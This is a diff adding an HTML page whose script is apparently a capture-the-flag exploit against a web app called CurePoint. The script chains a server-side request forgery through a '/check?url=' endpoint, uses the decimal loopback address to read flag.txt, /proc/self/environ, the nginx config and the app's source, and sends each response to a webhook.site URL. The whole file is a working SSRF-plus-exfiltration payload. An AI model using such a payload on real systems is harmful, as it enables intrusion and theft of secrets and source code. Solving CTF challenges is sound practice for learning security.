@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html>
+<head><title>x</title></head>
+<body>
+<script>
+// Este corre en cdn.jsdelivr.net - sin restricciones CSP de CurePoint
+var notify = 'http://311b405f-4c7f-45d5-94f9-999a49604ce1.ctf.hackconrd.org:8001';
+var webhook = 'https://webhook.site/83c9e8c3-384e-4bea-a583-b1b1de596d17';
+
+var paths = [
+  '/check?url=' + encodeURIComponent('http://2130706433/flag.txt'),
+  '/check?url=' + encodeURIComponent('http://2130706433/proc/self/environ'),
+  '/check?url=' + encodeURIComponent('http://2130706433/etc/nginx/nginx.conf'),
+  '/check?url=' + encodeURIComponent('http://2130706433/app/app.py'),
+];
+
+paths.forEach(function(path) {
+  fetch(notify + path)
+    .then(r => r.text())
+    .then(data => {
+      fetch(webhook + '?path=' + encodeURIComponent(path) + '&data=' + encodeURIComponent(data));
+    });
+});
+</script>
+</body>
+</html>
